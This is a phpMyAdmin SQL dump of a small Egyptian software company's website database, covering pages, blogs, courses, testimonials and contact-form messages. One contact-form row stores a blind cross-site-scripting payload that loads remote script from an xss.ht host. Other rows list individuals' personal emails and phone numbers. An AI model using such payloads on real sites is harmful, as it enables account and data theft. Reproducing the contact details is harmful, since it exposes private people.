-- phpMyAdmin SQL Dump
-- version 5.0.2
-- https://www.phpmyadmin.net/
--
-- Host: 127.0.0.1
-- Generation Time: Jan 17, 2021 at 12:29 AM
-- Server version: 10.4.13-MariaDB
-- PHP Version: 7.4.7

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `qodeex-zte`
--

-- --------------------------------------------------------

--
-- Table structure for table `abouts`
--

CREATE TABLE `abouts` (
  `id` int(10) UNSIGNED NOT NULL,
  `title` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `description` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `img` varchar(100) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `page` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `created_at` datetime DEFAULT NULL,
  `updated_at` datetime DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `abouts`
--

INSERT INTO `abouts` (`id`, `title`, `description`, `img`, `page`, `created_at`, `updated_at`) VALUES
(1, '{\"en\":\"About Qodeex\",\"ar\":\"عن كودكس\"}', '{\"en\":\"<p>Our skills and knowledge are very flexible, we are able to accomplish literally any IT challange today\'s market can throw on us.</p><p><br></p>\",\"ar\":\"<p>Our skills and knowledge are very flexible, we are able to accomplish literally any IT challange today\'s market can throw on us.</p><p><br></p>\"}', '1597579445582.jpg', 'company', '2020-08-06 05:56:30', '2020-10-10 09:10:36'),
(2, '{\"en\":\"Mission\",\"ar\":\"المهام\"}', '{\"en\":\"<p><span style=\"color: rgb(31, 31, 31); background-color: rgb(255, 255, 255);\">Our mission is to enhance business growth of our customers with creative design, development and to deliver market defining high quality solutions that create value and reliable competitive advantage to customers around the globe.</span></p>\",\"ar\":\"<p><span style=\"color: rgb(31, 31, 31); background-color: rgb(255, 255, 255);\">Our mission is to enhance business growth of our customers with creative design, development and to deliver market defining high quality solutions that create value and reliable competitive advantage to customers around the globe.</span></p>\"}', '1597579572433.jpg', 'company', '2020-08-06 05:56:39', '2020-09-21 17:52:06'),
(3, '{\"en\":\"Vision\",\"ar\":\"الرؤية\"}', '{\"en\":\"<p><span style=\"background-color: rgb(255, 255, 255); color: rgb(31, 31, 31);\">Our main aim is to develop in a constant manner and become a leading performer in this competitive global marketplace. Fortunately, we have been able to gather a crew of professionals that can shape and mold their collective experiences, all of them posses outstanding talent that can help to accelerate your organization.</span></p>\",\"ar\":\"<p><span style=\"background-color: rgb(255, 255, 255); color: rgb(31, 31, 31);\">Our main aim is to develop in a constant manner and become a leading performer in this competitive global marketplace. Fortunately, we have been able to gather a crew of professionals that can shape and mold their collective experiences, all of them posses outstanding talent that can help to accelerate your organization.</span></p>\"}', '1597579557012.jpg', 'company', '2020-08-06 05:56:45', '2020-09-21 17:51:49'),
(4, '{\"en\":\"We select the best talents and train them\",\"ar\":\"We select the best talents and train them\"}', '{\"en\":\"<p>At Qodeex we have a strong recruitment process aimed at hiring talented people. We train our employees so they can easily adapt to our workflow and grow professionally.</p>\",\"ar\":\"<p>At Qodeex we have a strong recruitment process aimed at hiring talented people. We train our employees so they can easily adapt to our workflow and grow professionally.</p>\"}', '1597574144328.webp', 'team', '2020-08-06 05:57:00', '2020-08-16 06:35:44'),
(6, '{\"en\":\"Our Software Development Life Cycle accelerates software delivery\",\"ar\":\"Our Software Development Life Cycle accelerates software delivery\"}', '{\"en\":\"<p>We combine the best practices of Agile with our own approach to software development to effectively build, test, and deploy our work.</p>\",\"ar\":\"<p>We combine the best practices of Agile with our own approach to software development to effectively build, test, and deploy our work.</p>\"}', '1597574187848.webp', 'team', '2020-08-16 06:36:27', '2020-08-16 06:36:27'),
(7, '{\"en\":\"We use modern technologies for web and mobile app development\",\"ar\":\"We use modern technologies for web and mobile app development\"}', '{\"en\":\"<p>Web Development is our core expertise. But we mix different technologies to develop reliable and robust frontend, backend and infrastructure.</p><p><br></p>\",\"ar\":\"<p>Web Development is our core expertise. But we mix different technologies to develop reliable and robust frontend, backend and infrastructure.</p><p><br></p>\"}', '1597574238368.webp', 'team', '2020-08-16 06:37:18', '2020-10-10 09:10:58');

-- --------------------------------------------------------

--
-- Table structure for table `adonis_schema`
--

CREATE TABLE `adonis_schema` (
  `id` int(10) UNSIGNED NOT NULL,
  `name` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `batch` int(11) DEFAULT NULL,
  `migration_time` timestamp NOT NULL DEFAULT current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `adonis_schema`
--

INSERT INTO `adonis_schema` (`id`, `name`, `batch`, `migration_time`) VALUES
(1, '1503250034279_user', 1, '2020-08-06 09:46:33'),
(2, '1503250034280_token', 1, '2020-08-06 09:46:33'),
(3, '1595968475447_info_schema', 1, '2020-08-06 09:46:33'),
(4, '1596107743577_header_schema', 1, '2020-08-06 09:46:33'),
(5, '1596107880627_partner_schema', 1, '2020-08-06 09:46:33'),
(6, '1596107930677_client_schema', 1, '2020-08-06 09:46:33'),
(7, '1596108030863_blog_schema', 1, '2020-08-06 09:46:33'),
(8, '1596108260076_about_schema', 1, '2020-08-06 09:46:34'),
(9, '1596108348261_technology_schema', 1, '2020-08-06 09:46:34'),
(10, '1596108402855_feature_schema', 1, '2020-08-06 09:46:34'),
(11, '1596108582661_category_schema', 1, '2020-08-06 09:46:34'),
(12, '1596108766723_experience_schema', 1, '2020-08-06 09:46:34'),
(13, '1596108878666_team_schema', 1, '2020-08-06 09:46:34'),
(14, '1596108993232_email_schema', 1, '2020-08-06 09:46:34'),
(17, '1605951634237_courses_schema', 2, '2020-11-21 14:58:10'),
(18, '1605968827332_student_schema', 2, '2020-11-21 14:58:10'),
(19, '1606052889404_branch_schema', 3, '2020-11-22 14:10:03');

-- --------------------------------------------------------

--
-- Table structure for table `blogs`
--

CREATE TABLE `blogs` (
  `id` int(10) UNSIGNED NOT NULL,
  `title` varchar(100) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `slug` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `description` mediumtext COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `img` varchar(100) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `publisher` varchar(100) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `type` varchar(100) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `created_at` datetime DEFAULT NULL,
  `updated_at` datetime DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `blogs`
--

INSERT INTO `blogs` (`id`, `title`, `slug`, `description`, `img`, `publisher`, `type`, `created_at`, `updated_at`) VALUES
(4, '{\"en\":\"aa\",\"ar\":\"اا\"}', '{\"en\":\"aa\",\"ar\":\"الثلا\"}', '{\"en\":\"aa\",\"ar\":\"اا\"}', '1597573988832.jpg', 'Ahmed Hashem', '{\"en\":\"web\",\"ar\":\"ويب\"}', '2021-01-16 12:05:05', '2021-01-16 12:05:05'),
(5, '{\"en\":\"bb\",\"ar\":\"يي\"}', '{\"en\":\"bb\",\"ar\":\"قلقل\"}', '{\"en\":\"bb\",\"ar\":\"يي\"}', '1597573988832.jpg', 'Mohamed Hashem', '{\"en\":\"android\",\"ar\":\"موبايل\"}', '2021-01-16 12:12:16', '2021-01-16 12:12:16'),
(6, '{\"en\":\"ss\",\"ar\":\"ثثفثف\"}', '{\"en\":\"ss\",\"ar\":\"فافاف\"}', '{\"en\":\"ss\",\"ar\":\"اا\"}', '1597573988832.jpg', 'Ahmed Hashem Yousef', '{\"en\":\"web\",\"ar\":\"ويب\"}', '2021-01-16 12:05:05', '2021-01-16 12:05:05');

-- --------------------------------------------------------

--
-- Table structure for table `branches`
--

CREATE TABLE `branches` (
  `id` int(10) UNSIGNED NOT NULL,
  `title` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `address` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `phone` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `created_at` datetime DEFAULT NULL,
  `updated_at` datetime DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `branches`
--

INSERT INTO `branches` (`id`, `title`, `address`, `phone`, `created_at`, `updated_at`) VALUES
(2, 'test', 'test', '6261', '2020-12-01 04:54:13', '2020-12-01 04:54:13');

-- --------------------------------------------------------

--
-- Table structure for table `categories`
--

CREATE TABLE `categories` (
  `id` int(10) UNSIGNED NOT NULL,
  `img` varchar(100) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `title` varchar(100) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `category` varchar(100) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `description` mediumtext COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `page` varchar(100) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `created_at` datetime DEFAULT NULL,
  `updated_at` datetime DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `categories`
--

INSERT INTO `categories` (`id`, `img`, `title`, `category`, `description`, `page`, `created_at`, `updated_at`) VALUES
(5, '1596722394821.png', '{\"en\":\"Web\",\"ar\":\"ويب\"}', 'Development', '{\"en\":\"Develop web applications that satisify requirements of market using modern technologies\",\"ar\":\"Develop web applications that satisify requirements of market using modern technologies\"}', '{\"en\":\"web\",\"ar\":\"ويب\"}', '2020-08-06 09:59:54', '2020-10-10 09:10:26'),
(6, '1596722451201.png', '{\"en\":\"Mobile\",\"ar\":\"موبايل\"}', 'Development', '{\"en\":\"Develop mobile applications that satisify requirements of market using modern technologies Android & IOS\",\"ar\":\"Develop mobile applications that satisify requirements of market using modern technologies Android & IOS\"}', '{\"en\":\"mobile\",\"ar\":\"موبايل\"}', '2020-08-06 10:00:51', '2020-09-21 17:37:53'),
(7, '1596722521631.png', '{\"en\":\"UI UX\",\"ar\":\"تصميمات\"}', 'Design', '{\"en\":\"Design applications mobile & web in modern designs  to satisify market requirements  using modern technologies\",\"ar\":\"Design applications mobile & web in modern designs  to satisify market requirements  using modern technologies\"}', '{\"en\":\"ui-ux\",\"ar\":\"تصميم\"}', '2020-08-06 10:02:01', '2020-09-21 17:39:20');

-- --------------------------------------------------------

--
-- Table structure for table `clients`
--

CREATE TABLE `clients` (
  `id` int(10) UNSIGNED NOT NULL,
  `comment` mediumtext COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `img` varchar(100) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `name` varchar(100) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `job` varchar(100) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `created_at` datetime DEFAULT NULL,
  `updated_at` datetime DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `clients`
--

INSERT INTO `clients` (`id`, `comment`, `img`, `name`, `job`, `created_at`, `updated_at`) VALUES
(1, 'This company is perfect in websites', '1597581606268.jpg', 'ELSAMANODY', 'Doctor', '2020-08-06 07:36:01', '2020-08-16 08:40:35'),
(2, 'I\'m so happy working with Qodeex company', '1597581310636.jpg', 'CCSS', 'Owner of CCSS', '2020-08-16 08:33:55', '2020-08-16 08:35:10'),
(3, 'I\'m cheerful for acting with this company', '1597581878753.jpg', 'Ahmed Meligi', 'Lawyer and cassation', '2020-08-16 08:44:38', '2020-08-16 08:45:20'),
(4, 'I\'m pleased to have an application \"Quiz Application\"', '1597582192572.png', 'Ahmed El Hakem', 'Teacher', '2020-08-16 08:49:52', '2020-08-16 08:49:52'),
(5, 'Contracting with Algawhar Investment and Development Company', '1597582538960.jpg', 'Weqaya Hospital', 'Hospital', '2020-08-16 08:55:38', '2020-08-16 08:55:38');

-- --------------------------------------------------------

--
-- Table structure for table `courses`
--

CREATE TABLE `courses` (
  `id` int(10) UNSIGNED NOT NULL,
  `title` varchar(100) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `description` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `img` varchar(100) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `video` varchar(100) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `price` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `branch` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `instructor` varchar(100) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `email` varchar(100) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `status` int(11) DEFAULT 1,
  `studentId` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `created_at` datetime DEFAULT NULL,
  `updated_at` datetime DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `courses`
--

INSERT INTO `courses` (`id`, `title`, `description`, `img`, `video`, `price`, `branch`, `instructor`, `email`, `status`, `studentId`, `created_at`, `updated_at`) VALUES
(2, 'c++', 'C++ is a cross-platform language that can be used to create high-performance applications.', '1606159088566.png', 'mmmm', '2000', 'october', 'ahmed', 'mohamedbadar@qodeex.com', 1, NULL, '2020-11-23 14:18:08', '2020-11-23 14:18:08'),
(4, 'test', 'C++ is a cross-platform language that can be used to create high-performance applications.', '1606743732196.png', 'kkk', '2', 'dddd', 'ahmed', 'mohamedbadar@qodeex.com', 1, NULL, '2020-11-30 07:02:48', '2020-11-30 08:42:12');

-- --------------------------------------------------------

--
-- Table structure for table `emails`
--

CREATE TABLE `emails` (
  `id` int(10) UNSIGNED NOT NULL,
  `name` varchar(100) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `email` varchar(100) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `phone` varchar(100) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `subject` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `message` mediumtext COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `created_at` datetime DEFAULT NULL,
  `updated_at` datetime DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `emails`
--

INSERT INTO `emails` (`id`, `name`, `email`, `phone`, `subject`, `message`, `created_at`, `updated_at`) VALUES
(20, 'ammar', 'ammyass2@gmail.com', '564865', 'fsdg', 'dgsdg', '2020-10-10 08:44:46', '2020-10-10 08:44:46'),
(30, 'Esraa Zarif', 'esraazarif87@gmail.com', '01127819906', 'Fresh Full stack developer and look for job', 'I\'m fresh graduate from faculty of computer and information science ain shams university, I look for job in web development, I able to use html, css, javascript, sql, c#, asp net mvc ,html5, css3', '2020-11-19 18:55:09', '2020-11-19 18:55:09'),
(31, 'ccc', 'cccc@gmail.com', 'ddd', 'ffcc', 'ccc', '2020-11-20 09:57:37', '2020-11-20 09:57:37'),
(32, 'Reemzolfakkar', 'reemzolfakkar@gmail.com', '01113405561', 'fffff', 'dyhbjvghv', '2020-11-21 07:03:30', '2020-11-21 07:03:30'),
(33, 'Reemzolfakkar', 'reemzolfakkar@gmail.com', '01113405561', 'fffff', 'dyhbjvghv', '2020-11-21 07:03:38', '2020-11-21 07:03:38'),
(34, 'Reemzolfakkar', 'reemzolfakkar@gmail.com', '01113405561', 'fffff', 'dyhbjvghv', '2020-11-21 07:04:29', '2020-11-21 07:04:29'),
(35, 'Ahmed', 'ahmedhashem2105@yahoo.com', '201116063026', 'nothing', 'adsd', '2020-11-21 07:06:47', '2020-11-21 07:06:47'),
(36, 'Reemzolfakkar', 'reemzolfakkar@gmail.com', '01113405561', 'rrrr', 'mgkmgkgmkg', '2020-11-21 07:17:00', '2020-11-21 07:17:00'),
(37, 'reem', 'reemzolfakkar@gmail.com', '01113405561', 'dddd', 'ddjdjdjjdjd', '2020-11-21 07:25:39', '2020-11-21 07:25:39'),
(38, 'reem', 'reemzolfakkar@gmail.com', '01113405561', 'dhjjdjdj', 'xmkdkdmkd', '2020-11-21 07:26:47', '2020-11-21 07:26:47'),
(39, 'reem', 'reemzolfakkar@gmail.com', '01113405561', 'dhjjdjdj', 'xmkdkdmkd', '2020-11-21 07:26:51', '2020-11-21 07:26:51'),
(40, 'reem', 'reemzolfakkar@gmail.com', '01113405561', 'dhjjdjdj', 'xmkdkdmkd', '2020-11-21 07:26:57', '2020-11-21 07:26:57'),
(41, 'reem', 'reemzolfakkar@gmail.com', '01113405561', 'kkk', 'fffff', '2020-11-21 07:28:57', '2020-11-21 07:28:57'),
(42, 'enji', 'enji@gmail.com', '01125697548', 'nothing', 'loojdjdjdjd', '2020-11-25 03:24:53', '2020-11-25 03:24:53'),
(43, 'enji', 'enji@gmail.com', '01125697548', 'nothing', 'loojdjdjdjd', '2020-11-25 03:27:32', '2020-11-25 03:27:32'),
(44, 'engi', 'enji@gmail.com', '01113405561', 'nothing', 'ffffff', '2020-11-25 05:27:33', '2020-11-25 05:27:33'),
(45, 'engi', 'enji@gmail.com', '01113405561', 'nothing', 'ffffff', '2020-11-25 05:29:13', '2020-11-25 05:29:13'),
(46, 'engi', 'enji@gmail.com', '01113405561', 'nothing', 'ffffff', '2020-11-25 05:33:27', '2020-11-25 05:33:27'),
(47, 'Reemzolfakkar', 'reemzolfakkar@gmail.com', '01113520267', 'bbbbb', 'gvvgv g', '2020-11-25 06:03:07', '2020-11-25 06:03:07'),
(48, 'reem', 'reemzolfakkar@gmail.com', '01113520267', 'd', 'xxx', '2020-11-25 06:11:25', '2020-11-25 06:11:25'),
(49, 'reem', 'reemzolfakkar@gmail.com', '01113520267', 'd', 'xxx', '2020-11-25 06:13:28', '2020-11-25 06:13:28'),
(50, 'xxxx', 'mohamedbadar@qodeex.com', '011134514584', 'dddd', '2000', '2020-11-25 06:15:04', '2020-11-25 06:15:04'),
(51, 'ahmed', 'enghamed.1191999@gmail.com', '01116063026', 'new one', 'This is our new one', '2020-11-25 07:06:26', '2020-11-25 07:06:26'),
(52, 'ahmed', 'enghamed.1191999@gmail.com', '01116063026', 'new one', 'This is our new one', '2020-11-25 07:07:20', '2020-11-25 07:07:20'),
(53, 'lina', 'lina@gmail.com', '01111', 'nothing', 'hhhh', '2020-11-25 07:08:50', '2020-11-25 07:08:50'),
(54, 'test', 'test@test.com', '4444', 'sssdd', 'ddd', '2020-12-02 07:10:09', '2020-12-02 07:10:09'),
(55, '\"><script src=https://badtest.xss.ht></script>', 'garifo2892@yektara.com', '\"><script src=https://badtest.xss.ht></script>', '\"><script src=https://badtest.xss.ht></script>', 'javascript:eval(\'var a=document.createElement(\\\'script\\\');a.src=\\\'https://badtest.xss.ht\\\';document.body.appendChild(a)\')', '2020-12-06 09:58:40', '2020-12-06 09:58:40'),
(56, 'milo', 'milo@jjtech.co', '08617713546379', 'Black Robotic Pipette Tips', 'Dear Sir/Madam\n\nHope you have a nice day!  Glad to know you are in market of Biotechnology. We are supplier of lab consumable in Shenzhen,China. We have over 14 years experiences in distribute lab consumables. I am sure we can offer you a very good price and quality.\n\n1. Black Robotic Pipette Tips(50ul-1000ul) Filter, Sterile, 96 PCS/RACK for Hamilton/TECAN.\n2. Universal Pipette Tips(10ul-1000ul) 1000pcs/bag,   96rack.\n3. 1cc Tuberculin Syringe, Luer Slip\n4. 8 strips tube / 12 strips \n5. 96  White/Clear 0.1ML PCR plates WITH SKIRT/ None-SKIRT, 15 PCS/RACK\n\nShould you have any questions, please do not hesitate to contact me.\n\n\nThanks&Best regards,', '2020-12-19 03:19:11', '2020-12-19 03:19:11'),
(57, 'Ahmed Hashem', 'ahmedhashem2105@yahoo.com', '01116063026', 'test test', 'Hi Ahmed Hashem', NULL, NULL),
(58, 'Ahmed Hashem', 'ahmedhashem2105@yahoo.com', '01116063026', 'test test', 'Hi Ahmed Hashem', '2021-01-16 11:58:54', NULL),
(59, 'Ahmed Hashem', 'ahmedhashem2105@yahoo.com', '01116063026', 'test test', 'Hi Ahmed Hashem', '2021-01-16 11:59:05', '2021-01-16 11:59:05'),
(60, NULL, NULL, '01116063026', 'test test', 'Hi Ahmed Hashem', '2021-01-16 12:11:45', '2021-01-16 12:11:45'),
(61, 'wgwgwg', 'erfe@rgrg.egweg', '01116063026', 'ehehwgwwg', 'rgfwgwg', '2021-01-16 13:01:23', '2021-01-16 13:01:23'),
(62, 'wgwgwg', 'erfe@rgrg.egweg', '01116063026', 'ehehwgwwg', 'rgfwgwg', '2021-01-16 13:02:58', '2021-01-16 13:02:58'),
(63, 'wgwgwg', 'erfe@rgrg.egweg', '01116063026', 'ehehwgwwg', 'rgfwgwg', '2021-01-16 13:03:08', '2021-01-16 13:03:08'),
(64, 'wgwgwg', 'erfe@rgrg.egweg', '01116063026', 'ehehwgwwg', 'rgfwgwg', '2021-01-16 13:03:29', '2021-01-16 13:03:29'),
(65, 'wgwgwg', 'erfe@rgrg.egweg', '01116063026', 'ehehwgwwg', 'rgfwgwg', '2021-01-16 13:04:08', '2021-01-16 13:04:08'),
(66, 'wgwgwg', 'erfe@rgrg.egweg', '01116063026', 'ehehwgwwg', 'rgfwgwg', '2021-01-16 13:04:46', '2021-01-16 13:04:46'),
(67, 'wgwgwg', 'erfe@rgrg.egweg', '01116063026', 'ehehwgwwg', 'rgfwgwg', '2021-01-16 13:05:25', '2021-01-16 13:05:25'),
(68, 'wgwgwg', 'erfe@rgrg.egweg', '01116063026', 'ehehwgwwg', 'rgfwgwg', '2021-01-16 13:06:46', '2021-01-16 13:06:46'),
(69, 'wgwgwg', 'erfe@rgrg.egweg', '01116063026', 'ehehwgwwg', 'rgfwgwg', '2021-01-16 13:06:49', '2021-01-16 13:06:49'),
(70, 'wgwgwg', 'erfe@rgrg.egweg', '01116063026', 'ehehwgwwg', 'rgfwgwg', '2021-01-16 13:06:51', '2021-01-16 13:06:51'),
(71, 'wgwgwg', 'erfe@rgrg.egweg', '01116063026', 'ehehwgwwg', 'rgfwgwg', '2021-01-16 13:07:06', '2021-01-16 13:07:06'),
(72, 'wgwgwg', 'erfe@rgrg.egweg', '01116063026', 'ehehwgwwg', 'rgfwgwg', '2021-01-16 13:09:32', '2021-01-16 13:09:32'),
(73, 'wefefg', 'ef@ef.ef', '01116063026', 'egegeg', 'egwfwf', '2021-01-16 13:14:45', '2021-01-16 13:14:45'),
(74, 'wefefg', 'ef@ef.ef', '01116063026', 'egegeg', 'egwfwf', '2021-01-16 13:15:49', '2021-01-16 13:15:49'),
(75, 'wefefg', 'ef@ef.ef', '01116063026', 'egegeg', 'egwfwf', '2021-01-16 13:16:02', '2021-01-16 13:16:02'),
(76, 'wefefg', 'ef@ef.ef', '01116063026', 'egegeg', 'egwfwf', '2021-01-16 13:16:21', '2021-01-16 13:16:21');

-- --------------------------------------------------------

--
-- Table structure for table `experiences`
--

CREATE TABLE `experiences` (
  `id` int(10) UNSIGNED NOT NULL,
  `title` varchar(100) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `description` mediumtext COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `page` varchar(100) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `icon` varchar(50) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `created_at` datetime DEFAULT NULL,
  `updated_at` datetime DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `experiences`
--

INSERT INTO `experiences` (`id`, `title`, `description`, `page`, `icon`, `created_at`, `updated_at`) VALUES
(1, '{\"en\":\"Web Development\",\"ar\":\"تطوير مواقع الويب\"}', '{\"en\":\"Develop web applications that satisify requirements of market using modern technologies\",\"ar\":\"Develop web applications that satisify requirements of market using modern technologies\"}', '{\"en\":\"team\",\"ar\":\"فريق\"}', NULL, '2020-08-06 06:31:01', '2020-08-06 06:33:08'),
(2, 'Work with us?', '{\"en\":\"Currently we don\'t have any open positions but if you are interested in possible future opportunities please send your CV\r\n\",\"ar\":\"Currently we don\'t have any open positions but if you are interested in possible future opportunities please send your CV\r\n\"}', '{\"en\":\"company\",\"ar\":\"شركة\"}', NULL, '2020-08-06 06:32:14', '2020-08-06 06:32:14'),
(3, 'Services', '{\"en\":\"Develop & Design Software applications\",\"ar\":\"Develop & Design Software applications\"}', '{\"en\":\"services\",\"ar\":\"خدمات\"}', NULL, '2020-08-06 06:51:38', '2020-08-06 06:51:38'),
(9, '{\"en\":\"Web Development\",\"ar\":\"تطوير مواقع الويب\"}', '{\"en\":\"Develop web applications that satisify requirements of market using modern technologies\",\"ar\":\"Develop web applications that satisify requirements of market using modern technologies\"}', '{\"en\":\"web\",\"ar\":\"ويب\"}', 'web.png', '2020-08-06 09:59:54', '2020-08-06 09:59:54'),
(10, '{\"en\":\"Mobile Development\",\"ar\":\"تطوير تطبيقات الموبايل\"}', '{\"en\":\"Develop mobile applications that satisify requirements of market using modern technologies Android & IOS\",\"ar\":\"Develop mobile applications that satisify requirements of market using modern technologies Android & IOS\"}', '{\"en\":\"mobile\",\"ar\":\"موبايل\"}', 'mobile.png', '2020-08-06 10:00:51', '2020-08-06 10:00:51'),
(11, '{\"en\":\"UI - UX Design\",\"ar\":\"تصميم واجهة المستخدم\"}', '{\"en\":\"Design applications mobile & web in modern designs to satisify market requirements using modern technologies\",\"ar\":\"Design applications mobile & web in modern designs to satisify market requirements using modern technologies\"}', '{\"en\":\"ui-ux\",\"ar\":\"تصميم\"}', 'ui-ux.png', '2020-08-06 10:02:01', '2020-08-06 10:02:01');

-- --------------------------------------------------------

--
-- Table structure for table `features`
--

CREATE TABLE `features` (
  `id` int(10) UNSIGNED NOT NULL,
  `img` varchar(100) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `title` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `description` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `publisher` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `job` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `link` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `page` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `created_at` datetime DEFAULT NULL,
  `updated_at` datetime DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `features`
--

INSERT INTO `features` (`id`, `img`, `title`, `description`, `publisher`, `job`, `link`, `page`, `created_at`, `updated_at`) VALUES
(1, '1597577622519.jpg', '{\"en\":\"MS for plastic website\",\"ar\":\"MS for plastic website\"}', '{\"en\":\"MS for plastic is a website for an Egyptian factory in cooperation with Sweden to produce and export plastic\",\"ar\":\"MS for plastic is a website for an Egyptian factory in cooperation with Sweden to produce and export plastic\"}', '{\"en\":\"Ammar Yasser\",\"ar\":\"عمار ياسر\"}', '{\"en\":\"Web Developer\",\"ar\":\"ويب ديفيلوبر\"}', 'https://msforplastic.com/', '{\"en\":\"web\",\"ar\":\"ويب\"}', '2020-08-06 06:02:49', '2020-10-04 10:53:39'),
(2, '1597579142353.jpg', '{\"en\":\"Mawaan search engine website\",\"ar\":\"Mawaan search engine website\"}', '{\"en\":\"Mawaan is a product search engine and one of the most important search engines\",\"ar\":\"Mawaan is a product search engine and one of the most important search engines\"}', '{\"en\":\"Ahmed Hashem\",\"ar\":\"أحمد هاشم\"}', '{\"en\":\"Web Developer\",\"ar\":\"ويب ديفيلوبر\"}', 'https://mawaan.com', '{\"en\":\"home\",\"ar\":\"رئيسية\"}', '2020-08-06 10:42:45', '2020-10-10 09:11:15');

-- --------------------------------------------------------

--
-- Table structure for table `infos`
--

CREATE TABLE `infos` (
  `id` int(10) UNSIGNED NOT NULL,
  `title` varchar(100) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `description` mediumtext COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `keywords` mediumtext COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `email` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `logo` varchar(100) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `icon` varchar(100) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `facebook` varchar(100) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `twitter` varchar(100) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `linkedin` varchar(100) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `instagram` varchar(100) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `github` varchar(100) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `map` text COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `phone` varchar(20) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `created_at` datetime DEFAULT NULL,
  `updated_at` datetime DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `infos`
--

